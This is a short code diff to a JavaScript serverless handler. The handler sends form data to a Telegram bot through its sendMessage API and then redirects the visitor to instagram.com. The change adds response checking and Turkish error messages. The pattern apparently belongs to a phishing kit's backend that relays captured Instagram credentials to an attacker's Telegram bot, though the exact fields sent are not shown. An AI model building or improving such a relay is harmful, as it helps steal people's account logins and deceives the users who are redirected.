@@ -20,7 +20,7 @@ export default async function handler(req, res) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
     try {
-        await fetch(url, {
+        const response = await fetch(url, {
             method: "POST",
             headers: {"Content-Type": "application/x-www-form-urlencoded"},
             body: new URLSearchParams({
@@ -29,9 +29,15 @@ export default async function handler(req, res) {
             }),
         });
 
+        if (!response.ok) {
+            const errorData = await response.json();
+            console.error("Telegram API Error:", errorData);
+            return res.status(500).json({message: "Telegram API hatası oluştu.", error: errorData});
+        }
+
         res.status(302).redirect("https://www.instagram.com/");
     } catch (err) {
-        console.error(err);
-        res.status(500).json({message: "Hata oluştu"});
+        console.error("Network Error:", err);
+        res.status(500).json({message: "Hata oluştu", error: err.message});
     }
 }
